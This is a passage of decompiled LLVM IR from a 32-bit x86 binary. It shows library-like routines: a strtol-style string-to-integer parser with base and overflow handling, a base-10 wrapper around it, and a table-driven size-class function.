  %v1_804f050 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f050 = mul i32 %v1_804f050, 4
  %v3_804f050 = add i32 %v2_804f050, %v0_804f050
  store i32 %v3_804f050, i32* %eax.global-to-local, align 4
  %v1_804f053 = load i32, i32* @esi, align 4
  %v2_804f053 = inttoptr i32 %v1_804f053 to i32*
  store i32 %v3_804f050, i32* %v2_804f053, align 4
  %v3_804f055 = load i64, i64* %stack_var_-40, align 8
  %v6_804f055 = mul nsw i64 %v3_804f055, 10
  %v7_804f055 = trunc i64 %v6_804f055 to i32
  %v2_804f05b = ptrtoint i32* %stack_var_-20 to i32
  %v1_804f06825 = add i32 %v7_804f055, -1
  %v9_804f06826 = icmp slt i32 %v1_804f06825, 0
  store i32 %v1_804f06825, i32* @ebx, align 4
  %v1_804f06927 = icmp eq i1 %v9_804f06826, false
  br i1 %v1_804f06927, label %dec_label_pc_804f05b, label %dec_label_pc_804f06b

dec_label_pc_804f05b:                             ; preds = %dec_label_pc_804f04a, %dec_label_pc_804f05b
  store i32 %v2_804f05b, i32* %eax.global-to-local, align 4
  %v0_804f060 = load i32, i32* @esi, align 4
  %v2_804f061 = inttoptr i32 %v0_804f060 to i32*
  %v3_804f061 = call i32 @function_804ef7d(i32* %v2_804f061, i32 %v2_804f05b)
  store i32 %v0_804f060, i32* %eax.global-to-local, align 4
  store i32 %v2_804f05b, i32* %edx.global-to-local, align 4
  %v0_804f068.pre = load i32, i32* @ebx, align 4
  %v1_804f068 = add i32 %v0_804f068.pre, -1
  %v9_804f068 = icmp slt i32 %v1_804f068, 0
  store i32 %v1_804f068, i32* @ebx, align 4
  %v1_804f069 = icmp eq i1 %v9_804f068, false
  br i1 %v1_804f069, label %dec_label_pc_804f05b, label %dec_label_pc_804f06b

dec_label_pc_804f06b:                             ; preds = %dec_label_pc_804f04a, %dec_label_pc_804f05b, %dec_label_pc_804eff5
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f06d

dec_label_pc_804f06d:                             ; preds = %dec_label_pc_804efdb, %dec_label_pc_804f06b
  %v0_804f074 = phi i32 [ -1, %dec_label_pc_804efdb ], [ 0, %dec_label_pc_804f06b ]
  store i32 %v0_804efe1, i32* @ebx, align 4
  store i32 %v0_804efe0, i32* @esi, align 4
  store i32 %v0_804efdf, i32* @edi, align 4
  store i32 %v0_804efdb, i32* @ebp, align 4
  ret i32 %v0_804f074

; uselistorder directives
  uselistorder i32 %v1_804f068, { 1, 0 }
  uselistorder i32 %v0_804f04a, { 1, 0 }
  uselistorder i32 %v1_804f033, { 2, 1, 0 }
  uselistorder i32 %v2_804f031, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_804f00b, { 1, 0, 2 }
  uselistorder i32 %v3_804efed, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_804f06d, { 1, 0 }
  uselistorder label %dec_label_pc_804f06b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f05b, { 1, 0 }
  uselistorder label %dec_label_pc_804f017, { 1, 0 }
}

define i32 @function_804f075(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f075:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_804f077 = load i32, i32* @esi, align 4
  %v0_804f078 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_804f099, label %dec_label_pc_804f08d

dec_label_pc_804f08d:                             ; preds = %dec_label_pc_804f075
  %v2_804f08d = icmp ult i32 %arg3, 256
  %v1_804f094 = select i1 %v2_804f08d, i32 5, i32 4
  store i32 %v1_804f094, i32* @ebx, align 4
  br label %dec_label_pc_804f0af

dec_label_pc_804f099:                             ; preds = %dec_label_pc_804f075
  %v6_804f09c = icmp ugt i32 %arg3, 31
  br i1 %v6_804f09c, label %dec_label_pc_804f0a7, label %dec_label_pc_804f09e

dec_label_pc_804f09e:                             ; preds = %dec_label_pc_804f099
  store i32 0, i32* @ebx, align 4
  %v6_804f0a3 = icmp ugt i32 %arg3, 7
  br i1 %v6_804f0a3, label %dec_label_pc_804f0af, label %dec_label_pc_804f0ff

dec_label_pc_804f0a7:                             ; preds = %dec_label_pc_804f099
  %v2_804f0a7 = icmp ult i32 %arg3, 64
  %v1_804f0ac = select i1 %v2_804f0a7, i32 3, i32 2
  store i32 %v1_804f0ac, i32* @ebx, align 4
  br label %dec_label_pc_804f0af

dec_label_pc_804f0af:                             ; preds = %dec_label_pc_804f09e, %dec_label_pc_804f08d, %dec_label_pc_804f0a7
  %v0_804f0b9 = phi i32 [ 0, %dec_label_pc_804f09e ], [ %v1_804f094, %dec_label_pc_804f08d ], [ %v1_804f0ac, %dec_label_pc_804f0a7 ]
  %v1_804f0af = mul nuw nsw i32 %v0_804f0b9, 4
  %v2_804f0af = add i32 %v1_804f0af, ptrtoint (i32* @global_var_80546b4.168 to i32)
  %v3_804f0af = inttoptr i32 %v2_804f0af to i32*
  %v4_804f0af = load i32, i32* %v3_804f0af, align 4
  store i32 %v4_804f0af, i32* %eax.global-to-local, align 4
  %v1_804f0b6 = add i32 %tmp7, 4
  store i32 %v1_804f0b6, i32* @esi, align 4
  %v2_804f0b9 = add i32 %v1_804f0af, ptrtoint (i32* @global_var_80546a0.169 to i32)
  %v3_804f0b9 = inttoptr i32 %v2_804f0b9 to i32*
  %v4_804f0b9 = load i32, i32* %v3_804f0b9, align 4
  store i32 %v4_804f0b9, i32* %edx.global-to-local, align 4
  %v2_804f0c0 = add i32 %arg4, 12
  %v3_804f0c0 = inttoptr i32 %v2_804f0c0 to i32*
  store i32 %v0_804f0b9, i32* %v3_804f0c0, align 4
  %v0_804f0c3 = load i32, i32* @esi, align 4
  %v1_804f0c3 = load i32, i32* @edi, align 4
  %v2_804f0c3 = add i32 %v1_804f0c3, 8
  %v3_804f0c3 = inttoptr i32 %v2_804f0c3 to i32*
  store i32 %v0_804f0c3, i32* %v3_804f0c3, align 4
  %v0_804f0c6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0c6 = load i32, i32* @edi, align 4
  %v2_804f0c6 = add i32 %v1_804f0c6, 16
  %v3_804f0c6 = inttoptr i32 %v2_804f0c6 to i32*
  store i32 %v0_804f0c6, i32* %v3_804f0c6, align 4
  %v0_804f0c9 = load i32, i32* @esi, align 4
  %v1_804f0c9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804f0c9 = mul i32 %v1_804f0c9, 4
  %v3_804f0c9 = add i32 %v2_804f0c9, %v0_804f0c9
  store i32 %v3_804f0c9, i32* %eax.global-to-local, align 4
  %v0_804f0cc = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0cc = load i32, i32* @edi, align 4
  %v2_804f0cc = add i32 %v1_804f0cc, 20
  %v3_804f0cc = inttoptr i32 %v2_804f0cc to i32*
  store i32 %v0_804f0cc, i32* %v3_804f0cc, align 4
  %v0_804f0cf = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0cf = load i32, i32* @edi, align 4
  %v2_804f0cf = add i32 %v1_804f0cf, 24
  %v3_804f0cf = inttoptr i32 %v2_804f0cf to i32*
  store i32 %v0_804f0cf, i32* %v3_804f0cf, align 4
  %v0_804f0d2 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_804f0d7 = inttoptr i32 %v0_804f0d2 to i32*
  %v3_804f0d7 = call i32 @function_804efdb(i32 %arg1, i32* %v2_804f0d7)
  %v0_804f0dc = load i32, i32* @ebp, align 4
  %v1_804f0dc = inttoptr i32 %v0_804f0dc to i32*
  store i32 0, i32* %v1_804f0dc, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804f0e7 = load i32, i32* @ebx, align 4
  %v1_804f0e7 = icmp eq i32 %v0_804f0e7, 0
  br i1 %v1_804f0e7, label %dec_label_pc_804f118, label %dec_label_pc_804f0eb

dec_label_pc_804f0eb:                             ; preds = %dec_label_pc_804f0af
  %v0_804f0eb = load i32, i32* @edi, align 4
  %v1_804f0eb = add i32 %v0_804f0eb, 4
  %v2_804f0eb = inttoptr i32 %v1_804f0eb to i32*
  %v3_804f0eb = load i32, i32* %v2_804f0eb, align 4
  %v1_804f0ee = load i32, i32* @esi, align 4
  %v2_804f0ee = sub i32 %v3_804f0eb, %v1_804f0ee
  %v2_804f0f0 = sdiv i32 %v2_804f0ee, 4
  %v3_804f0f3 = mul i32 %v2_804f0f0, 5
  %v2_804f0f6 = add i32 %v3_804f0f3, %v0_804f0e7
  %v1_804f0f8 = load i32, i32* @ebp, align 4
  %v2_804f0f8 = inttoptr i32 %v1_804f0f8 to i32*
  store i32 %v2_804f0f6, i32* %v2_804f0f8, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f118

dec_label_pc_804f0ff:                             ; preds = %dec_label_pc_804f09e
  %v1_804f0ff = call i32 @function_804baa4(i32 %v0_804f078)
  store i32 %v1_804f0ff, i32* %eax.global-to-local, align 4
  %v1_804f104 = inttoptr i32 %v1_804f0ff to i32*
  store i32 22, i32* %v1_804f104, align 4
  %v0_804f10a = load i32, i32* %stack_var_-36, align 4
  %v1_804f10a = call i32 @function_804baa4(i32 %v0_804f10a)
  %v1_804f10f = inttoptr i32 %v1_804f10a to i32*
  store i32 22, i32* %v1_804f10f, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f118

dec_label_pc_804f118:                             ; preds = %dec_label_pc_804f0af, %dec_label_pc_804f0eb, %dec_label_pc_804f0ff
  %v0_804f11f = phi i32 [ 0, %dec_label_pc_804f0af ], [ 0, %dec_label_pc_804f0eb ], [ -1, %dec_label_pc_804f0ff ]
  store i32 %v0_804f077, i32* @esi, align 4
  ret i32 %v0_804f11f

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804f118, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f0af, { 2, 0, 1 }
}

define i32 @function_804f120(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f120:
  %v3_804f12b = call i32 @function_804f134(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_804f12b
}

define i32 @function_804f134(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804f134:
  %v4_804f145 = inttoptr i32 %arg1 to i8*
  %v5_804f145 = call i32 @function_804f150(i8* %v4_804f145, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_804f145
}

define i32 @function_804f150(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f150:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f153 = load i32, i32* @ebx, align 4
  store i32 %v0_804f153, i32* %stack_var_-16, align 4
  %v4_804f157 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f157, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_804f15f = load i32, i32* @global_var_8056440, align 64
  store i32 %v0_804f15f, i32* %edx.global-to-local, align 4
  store i32 %v4_804f157, i32* %ebx.global-to-local, align 4
  %v2_804f16a41 = load i8, i8* %arg1, align 1
  %v3_804f16a42 = sext i8 %v2_804f16a41 to i32
  store i32 %v3_804f16a42, i32* %eax.global-to-local, align 4
  %v2_804f16d43 = mul nsw i32 %v3_804f16a42, 2
  %v3_804f16d44 = add i32 %v2_804f16d43, %v0_804f15f
  %v4_804f16d45 = inttoptr i32 %v3_804f16d44 to i8*
  %v5_804f16d46 = load i8, i8* %v4_804f16d45, align 1
  %v6_804f16d47 = and i8 %v5_804f16d46, 32
  %v7_804f16d48 = icmp eq i8 %v6_804f16d47, 0
  %v1_804f17149 = icmp eq i1 %v7_804f16d48, false
  br i1 %v1_804f17149, label %dec_label_pc_804f169, label %dec_label_pc_804f173

dec_label_pc_804f169:                             ; preds = %dec_label_pc_804f150, %dec_label_pc_804f169
  %v0_804f16950 = phi i32 [ %v1_804f169, %dec_label_pc_804f169 ], [ %v4_804f157, %dec_label_pc_804f150 ]
  %v1_804f169 = add i32 %v0_804f16950, 1
  store i32 %v1_804f169, i32* %ebx.global-to-local, align 4
  %v1_804f16a = inttoptr i32 %v1_804f169 to i8*
  %v2_804f16a = load i8, i8* %v1_804f16a, align 1
  %v3_804f16a = sext i8 %v2_804f16a to i32
  store i32 %v3_804f16a, i32* %eax.global-to-local, align 4
  %v2_804f16d = mul nsw i32 %v3_804f16a, 2
  %v3_804f16d = add i32 %v2_804f16d, %v0_804f15f
  %v4_804f16d = inttoptr i32 %v3_804f16d to i8*
  %v5_804f16d = load i8, i8* %v4_804f16d, align 1
  %v6_804f16d = and i8 %v5_804f16d, 32
  %v7_804f16d = icmp eq i8 %v6_804f16d, 0
  %v1_804f171 = icmp eq i1 %v7_804f16d, false
  br i1 %v1_804f171, label %dec_label_pc_804f169, label %dec_label_pc_804f173

dec_label_pc_804f173:                             ; preds = %dec_label_pc_804f169, %dec_label_pc_804f150
  %v0_804f169.lcssa = phi i32 [ %v4_804f157, %dec_label_pc_804f150 ], [ %v1_804f169, %dec_label_pc_804f169 ]
  %v2_804f16a.lcssa = phi i8 [ %v2_804f16a41, %dec_label_pc_804f150 ], [ %v2_804f16a, %dec_label_pc_804f169 ]
  %v3_804f16a.lcssa = phi i32 [ %v3_804f16a42, %dec_label_pc_804f150 ], [ %v3_804f16a, %dec_label_pc_804f169 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_804f173 = icmp eq i8 %v2_804f16a.lcssa, 43
  br i1 %v9_804f173, label %dec_label_pc_804f18e, label %dec_label_pc_804f178

dec_label_pc_804f178:                             ; preds = %dec_label_pc_804f173
  %v9_804f178 = icmp eq i8 %v2_804f16a.lcssa, 45
  %v1_804f180 = icmp eq i1 %v9_804f178, false
  br i1 %v1_804f180, label %dec_label_pc_804f18f, label %dec_label_pc_804f18e

dec_label_pc_804f18e:                             ; preds = %dec_label_pc_804f173, %dec_label_pc_804f178
  %storemerge5 = phi i8 [ 1, %dec_label_pc_804f178 ], [ 0, %dec_label_pc_804f173 ]
  %v1_804f18e = add i32 %v0_804f169.lcssa, 1
  store i32 %v1_804f18e, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f18f

dec_label_pc_804f18f:                             ; preds = %dec_label_pc_804f178, %dec_label_pc_804f18e
  %v0_804f1a1 = phi i32 [ %v1_804f18e, %dec_label_pc_804f18e ], [ %v0_804f169.lcssa, %dec_label_pc_804f178 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_804f18e ], [ 0, %dec_label_pc_804f178 ]
  %v1_804f18f = and i32 %arg3, -17
  %v2_804f18f = icmp eq i32 %v1_804f18f, 0
  %v1_804f197 = icmp eq i1 %v2_804f18f, false
  br i1 %v1_804f197, label %dec_label_pc_804f1bd, label %dec_label_pc_804f199

dec_label_pc_804f199:                             ; preds = %dec_label_pc_804f18f
  %v1_804f199 = add i32 %arg3, 10
  store i32 %v1_804f199, i32* %esi.global-to-local, align 4
  %v1_804f19c = inttoptr i32 %v0_804f1a1 to i8*
  %v2_804f19c = load i8, i8* %v1_804f19c, align 1
  %v8_804f19c = icmp eq i8 %v2_804f19c, 48
  %v1_804f19f = icmp eq i1 %v8_804f19c, false
  br i1 %v1_804f19f, label %dec_label_pc_804f1b2, label %dec_label_pc_804f1a1

dec_label_pc_804f1a1:                             ; preds = %dec_label_pc_804f199
  %v1_804f1a1 = add i32 %v0_804f1a1, 1
  store i32 %v1_804f1a1, i32* %ebx.global-to-local, align 4
  %v1_804f1a2 = add i32 %arg3, 8
  store i32 %v1_804f1a2, i32* %esi.global-to-local, align 4
  %v1_804f1a5 = inttoptr i32 %v1_804f1a1 to i8*
  %v2_804f1a5 = load i8, i8* %v1_804f1a5, align 1
  %v2_804f1a9 = or i8 %v2_804f1a5, 32
  %v7_804f1a9 = zext i8 %v2_804f1a9 to i32
  %v9_804f1a9 = and i32 %v3_804f16a.lcssa, -256
  %v10_804f1a9 = or i32 %v7_804f1a9, %v9_804f1a9
  store i32 %v10_804f1a9, i32* %eax.global-to-local, align 4
  %v10_804f1ab = icmp eq i8 %v2_804f1a9, 120
  %v1_804f1ad = icmp eq i1 %v10_804f1ab, false
  br i1 %v1_804f1ad, label %dec_label_pc_804f1b2, label %dec_label_pc_804f1af

dec_label_pc_804f1af:                             ; preds = %dec_label_pc_804f1a1
  %v2_804f1af = mul i32 %v1_804f1a2, 2
  store i32 %v2_804f1af, i32* %esi.global-to-local, align 4
  %v1_804f1b1 = add i32 %v0_804f1a1, 2
  store i32 %v1_804f1b1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f1b2

dec_label_pc_804f1b2:                             ; preds = %dec_label_pc_804f1a1, %dec_label_pc_804f199, %dec_label_pc_804f1af
  %v0_804f1da13 = phi i32 [ %v1_804f1a1, %dec_label_pc_804f1a1 ], [ %v0_804f1a1, %dec_label_pc_804f199 ], [ %v1_804f1b1, %dec_label_pc_804f1af ]
  %v0_804f23422 = phi i32 [ %v1_804f1a1, %dec_label_pc_804f1a1 ], [ %v4_804f157, %dec_label_pc_804f199 ], [ %v1_804f1a1, %dec_label_pc_804f1af ]
  %v3_804f1ba = phi i32 [ %v1_804f1a2, %dec_label_pc_804f1a1 ], [ %v1_804f199, %dec_label_pc_804f199 ], [ %v2_804f1af, %dec_label_pc_804f1af ]
  %v1_804f1b2 = add i32 %v3_804f1ba, -17
  %v6_804f1b2 = sub i32 16, %v3_804f1ba
  %v7_804f1b2 = and i32 %v6_804f1b2, %v3_804f1ba
  %v8_804f1b2 = icmp slt i32 %v7_804f1b2, 0
  %v10_804f1b2 = icmp slt i32 %v1_804f1b2, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_804f1ba = icmp eq i1 %v10_804f1b2, %v8_804f1b2
  %v5_804f1ba = select i1 %v2_804f1ba, i32 16, i32 %v3_804f1ba
  store i32 %v5_804f1ba, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f1bd

dec_label_pc_804f1bd:                             ; preds = %dec_label_pc_804f18f, %dec_label_pc_804f1b2
  %v0_804f23423 = phi i32 [ %v4_804f157, %dec_label_pc_804f18f ], [ %v0_804f23422, %dec_label_pc_804f1b2 ]
  %v0_804f1da12 = phi i32 [ %v0_804f1a1, %dec_label_pc_804f18f ], [ %v0_804f1da13, %dec_label_pc_804f1b2 ]
  %v0_804f1cc = phi i32 [ %arg3, %dec_label_pc_804f18f ], [ %v5_804f1ba, %dec_label_pc_804f1b2 ]
  %v1_804f1bd = add i32 %v0_804f1cc, -2
  store i32 %v1_804f1bd, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_804f1c5 = icmp ugt i32 %v1_804f1bd, 34
  br i1 %v6_804f1c5, label %dec_label_pc_804f229, label %dec_label_pc_804f1c7

dec_label_pc_804f1c7:                             ; preds = %dec_label_pc_804f1bd
  %div = udiv i32 -1, %v0_804f1cc
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_804f1cc
  %v1_804f1ce = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_804f207 = urem i32 %arg4, 256
  br label %dec_label_pc_804f1da

dec_label_pc_804f1d8:                             ; preds = %dec_label_pc_804f21f, %dec_label_pc_804f207
  %v2_804f1dc.pre = phi i32 [ %v0_804f222, %dec_label_pc_804f21f ], [ %v2_804f1dc.pre.pre, %dec_label_pc_804f207 ]
  %v4_804f1da.pre = phi i32 [ %v1_804f1f3, %dec_label_pc_804f21f ], [ %v4_804f1da.pre.pre, %dec_label_pc_804f207 ]
  %v0_804f1d8 = phi i32 [ %v1_804f1fa, %dec_label_pc_804f21f ], [ %v0_804f1d8.pre, %dec_label_pc_804f207 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_804f21f ], [ %v6_804f20b, %dec_label_pc_804f207 ]
  br label %dec_label_pc_804f1da

dec_label_pc_804f1da:                             ; preds = %dec_label_pc_804f1c7, %dec_label_pc_804f1d8
  %v0_804f23421 = phi i32 [ %v0_804f23423, %dec_label_pc_804f1c7 ], [ %v0_804f1d8, %dec_label_pc_804f1d8 ]
  %v0_804f1fa = phi i32 [ %v0_804f1da12, %dec_label_pc_804f1c7 ], [ %v0_804f1d8, %dec_label_pc_804f1d8 ]
  %v2_804f1dc = phi i32 [ %v4_804f157, %dec_label_pc_804f1c7 ], [ %v2_804f1dc.pre, %dec_label_pc_804f1d8 ]
  %v4_804f1da = phi i32 [ %div, %dec_label_pc_804f1c7 ], [ %v4_804f1da.pre, %dec_label_pc_804f1d8 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804f1c7 ], [ %stack_var_-18.1, %dec_label_pc_804f1d8 ]
  %v1_804f1da = inttoptr i32 %v0_804f1fa to i8*
  %v2_804f1da = load i8, i8* %v1_804f1da, align 1
  %v3_804f1da = zext i8 %v2_804f1da to i32
  %v5_804f1da = and i32 %v4_804f1da, -256
  %v6_804f1da = or i32 %v3_804f1da, %v5_804f1da
  store i32 %v6_804f1da, i32* %eax.global-to-local, align 4
  %v2_804f1de = add i8 %v2_804f1da, -48
  %v12_804f1de = zext i8 %v2_804f1de to i32
  %v14_804f1de = and i32 %v2_804f1dc, -256
  %v15_804f1de = or i32 %v12_804f1de, %v14_804f1de
  store i32 %v15_804f1de, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i8 %v2_804f1de, 10
  br i1 %tmp, label %dec_label_pc_804f1f3, label %dec_label_pc_804f1e6

dec_label_pc_804f1e6:                             ; preds = %dec_label_pc_804f1da
  %v2_804f1e6 = or i8 %v2_804f1da, 32
  %v7_804f1e6 = zext i8 %v2_804f1e6 to i32
  %v10_804f1e6 = or i32 %v7_804f1e6, %v5_804f1da
  store i32 %v10_804f1e6, i32* %eax.global-to-local, align 4
  %v2_804f1e8 = or i32 %v14_804f1de, 40
  store i32 %v2_804f1e8, i32* %ecx.global-to-local, align 4
  %tmp55 = icmp ult i8 %v2_804f1e6, 97
  br i1 %tmp55, label %dec_label_pc_804f1f3, label %dec_label_pc_804f1ee

dec_label_pc_804f1ee:                             ; preds = %dec_label_pc_804f1e6
  %v2_804f1f0 = add i8 %v2_804f1e6, -87
  %v15_804f1f0 = zext i8 %v2_804f1f0 to i32
  %v18_804f1f0 = or i32 %v15_804f1f0, %v14_804f1de
  store i32 %v18_804f1f0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f1f3

dec_label_pc_804f1f3:                             ; preds = %dec_label_pc_804f1e6, %dec_label_pc_804f1da, %dec_label_pc_804f1ee
  %v0_804f222 = phi i32 [ %v2_804f1e8, %dec_label_pc_804f1e6 ], [ %v15_804f1de, %dec_label_pc_804f1da ], [ %v18_804f1f0, %dec_label_pc_804f1ee ]
  %v1_804f1f3 = urem i32 %v0_804f222, 256
  store i32 %v1_804f1f3, i32* %eax.global-to-local, align 4
  %v1_804f1f6 = load i32, i32* %esi.global-to-local, align 4
  %v2_804f1f6 = sub i32 %v1_804f1f3, %v1_804f1f6
  %v10_804f1f6 = and i32 %v2_804f1f6, %v1_804f1f6
  %v11_804f1f6 = icmp slt i32 %v10_804f1f6, 0
  %v13_804f1f6 = icmp slt i32 %v2_804f1f6, 0
  %v2_804f1f8 = icmp eq i1 %v13_804f1f6, %v11_804f1f6
  br i1 %v2_804f1f8, label %dec_label_pc_804f229, label %dec_label_pc_804f1fa

dec_label_pc_804f1fa:                             ; preds = %dec_label_pc_804f1f3
  %v1_804f1fa = add i32 %v0_804f1fa, 1
  store i32 %v1_804f1fa, i32* %ebx.global-to-local, align 4
  %v0_804f1fb = load i32, i32* %edx.global-to-local, align 4
  %v1_804f1fb = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_804f1fb, %v1_804f1fb
  br i1 %tmp56, label %dec_label_pc_804f207, label %dec_label_pc_804f1ff

dec_label_pc_804f1ff:                             ; preds = %dec_label_pc_804f1fa
  %v12_804f1fb = icmp eq i32 %v0_804f1fb, %v1_804f1fb
  %v1_804f1ff = icmp eq i1 %v12_804f1fb, false
  br i1 %v1_804f1ff, label %dec_label_pc_804f21f, label %dec_label_pc_804f201

dec_label_pc_804f201:                             ; preds = %dec_label_pc_804f1ff
  %v1_804f201 = trunc i32 %v0_804f222 to i8
  %tmp57 = icmp ugt i8 %v1_804f201, %v1_804f1ce
  br i1 %tmp57, label %dec_label_pc_804f207, label %dec_label_pc_804f21f

dec_label_pc_804f207:                             ; preds = %dec_label_pc_804f201, %dec_label_pc_804f1fa
  store i32 %v4_804f207, i32* %eax.global-to-local, align 4
  %v6_804f20b = and i8 %stack_var_-18.2, %tmp37
  %v1_804f20f = sext i8 %v6_804f20b to i32
  %v2_804f20f = call i32 @function_804baa4(i32 %v1_804f20f)
  store i32 %v2_804f20f, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804f217 = inttoptr i32 %v2_804f20f to i32*
  store i32 34, i32* %v1_804f217, align 4
  %v0_804f1d8.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_804f1da.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_804f1dc.pre.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804f1d8

dec_label_pc_804f21f:                             ; preds = %dec_label_pc_804f201, %dec_label_pc_804f1ff
  %v4_804f21f = mul i32 %v0_804f1fb, %v1_804f1f6
  store i32 %v1_804f1f3, i32* %eax.global-to-local, align 4
  %v2_804f225 = add i32 %v4_804f21f, %v1_804f1f3
  store i32 %v2_804f225, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f1d8

dec_label_pc_804f229:                             ; preds = %dec_label_pc_804f1f3, %dec_label_pc_804f1bd
  %v0_804f234 = phi i32 [ %v0_804f23423, %dec_label_pc_804f1bd ], [ %v0_804f23421, %dec_label_pc_804f1f3 ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_804f1bd ], [ %stack_var_-18.2, %dec_label_pc_804f1f3 ]
  %v4_804f229 = icmp eq i32 %arg2, 0
  br i1 %v4_804f229, label %dec_label_pc_804f236, label %dec_label_pc_804f230

dec_label_pc_804f230:                             ; preds = %dec_label_pc_804f229
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804f234 = inttoptr i32 %arg2 to i32*
  store i32 %v0_804f234, i32* %v2_804f234, align 4
  br label %dec_label_pc_804f236

dec_label_pc_804f236:                             ; preds = %dec_label_pc_804f229, %dec_label_pc_804f230
  %v8_804f236 = icmp eq i8 %stack_var_-18.3, 0
  %v2_804f23b = zext i1 %v8_804f236 to i32
  %v13_804f23b = icmp eq i1 %v8_804f236, false
  %v1_804f23d3 = or i32 %v2_804f23b, -2147483648
  store i32 %v1_804f23d3, i32* %ebx.global-to-local, align 4
  %v5_804f243 = icmp eq i8 %tmp37, 0
  br i1 %v5_804f243, label %dec_label_pc_804f25b, label %dec_label_pc_804f24a

dec_label_pc_804f24a:                             ; preds = %dec_label_pc_804f236
  %v0_804f24a = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_804f24a, %v1_804f23d3
  br i1 %tmp58, label %dec_label_pc_804f24e, label %dec_label_pc_804f25b

dec_label_pc_804f24e:                             ; preds = %dec_label_pc_804f24a
  %v1_804f24e = sext i8 %stack_var_-18.3 to i32
  %v2_804f24e = call i32 @function_804baa4(i32 %v1_804f24e)
  store i32 %v2_804f24e, i32* %eax.global-to-local, align 4
  %v0_804f253 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804f253, i32* %edx.global-to-local, align 4
  %v1_804f255 = inttoptr i32 %v2_804f24e to i32*
  store i32 34, i32* %v1_804f255, align 4
  br label %dec_label_pc_804f25b

dec_label_pc_804f25b:                             ; preds = %dec_label_pc_804f24a, %dec_label_pc_804f236, %dec_label_pc_804f24e
  %v0_804f25b = load i32, i32* %edx.global-to-local, align 4
  %v1_804f25d = sub i32 0, %v0_804f25b
  %v4_804f264 = select i1 %v13_804f23b, i32 %v1_804f25d, i32 %v0_804f25b
  store i32 %v4_804f264, i32* %edx.global-to-local, align 4
  %v2_804f26a = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f26a, i32* @ebx, align 4
  store i32 %v4_804f264, i32* %eax.global-to-local, align 4
  ret i32 %v4_804f264

; uselistorder directives
  uselistorder i32 %v4_804f264, { 1, 0, 2 }
  uselistorder i1 %v8_804f236, { 1, 0 }
  uselistorder i8 %v6_804f20b, { 1, 0 }
  uselistorder i32 %v1_804f1fb, { 1, 0 }
  uselistorder i32 %v0_804f1fb, { 2, 1, 0 }
